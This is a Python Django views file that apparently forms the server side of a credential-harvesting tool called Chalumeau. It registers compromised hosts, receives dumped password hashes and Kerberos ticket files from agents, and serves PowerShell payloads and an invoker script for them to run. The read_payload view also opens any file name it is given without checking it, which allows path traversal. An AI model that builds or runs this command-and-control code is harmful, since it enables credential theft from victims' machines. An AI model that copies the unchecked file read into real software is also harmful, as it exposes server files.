# -*- encoding: utf-8 -*-
from __future__ import unicode_literals
from django.utils.translation import ugettext as _
from django.shortcuts import render, redirect
from django.conf import settings
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.http import HttpResponse, JsonResponse
from django.urls import reverse
from django.utils import timezone as djtz
from django.views.decorators.csrf import csrf_exempt
import os
from django.http import Http404
from src.core.utils import get_client_ip
from src.core.models import Machine,DumpedCredentials
from django.shortcuts import get_object_or_404

def ensure_agent(request):
    key = request.headers.get('Chalumeaukey',None)
    getkey_endpoint = reverse("web:get_guid_view")
    if getkey_endpoint == request.path:
        pass
    else:
        if not key:
            raise Http404("I am angry now")
        else:
            return get_object_or_404(Machine,guid=key)
    return None

def get_guid(request):
    ensure_agent(request)
    host_ip = get_client_ip(request)
    ret = ""
    if request.POST:
        Machineobject,created = Machine.objects.get_or_create(
            host_ip=host_ip,
            host_local_ip=request.POST.get('host_local_ip',None),
            host_name=request.POST.get('host_name',None),
            host_arch=request.POST.get('host_arch',None),
            host_domain=request.POST.get('host_domain',None),
            host_username=request.POST.get('host_username',None),
        )
        ret = Machineobject.guid
    return HttpResponse(ret)

def send_credentials(request):
    Machineobject = ensure_agent(request)
    if request.POST:
        Credsobject,created = DumpedCredentials.objects.get_or_create(
            type=request.POST.get('type', DumpedCredentials.HASH),
            username=request.POST.get('username', None),
            password=request.POST.get('password', None),
            machine=Machineobject,
        )
    return HttpResponse("")

def send_ticket(request):
    Machineobject = ensure_agent(request)
    if request.FILES:
        ticket_file = request.FILES.get('file',None)
        if ticket_file:
            filename_ = str(ticket_file).replace('.kirbi','').split(']')
            try:
                username = filename_[1]
            except:
                username = ticket_file
            Credsobject,created = DumpedCredentials.objects.get_or_create(
                type=DumpedCredentials.TICKET,
                ticketfile=ticket_file,
                username=str(username),
                password=request.POST.get('password', None),
                machine=Machineobject,
            )
    return HttpResponse("")

def read_payload(request):
    file_name = request.GET.get('file',None)
    if file_name:
        script = open(os.path.join(settings.PAYLOADS_DIR,file_name), 'r').read()
        return HttpResponse(script)
    return HttpResponse("write-host test")

def get_payloads(request):
    Machineobject = ensure_agent(request)
    payloadz = []
    if len(request.POST) == 0:
        for root, dirs, files in os.walk(settings.PAYLOADS_DIR):
            for file in files:
                payloadurl = f"{reverse('web:read_payloads_view')}?file={file}"
                payloadz.append(payloadurl)
        return JsonResponse({'payloads':payloadz})
    return HttpResponse("")

def get_invoker(request):
    return HttpResponse(open(os.path.join(settings.SCRIPTS_DIR, 'Invoke-chalumeau.ps1'),'r').read())

def delete_db(request):
    try:
        DumpedCredentials.objects.all().delete()
    except:
        pass
    try:
        Machine.objects.all().delete()
    except:
        pass  
    return redirect('/')
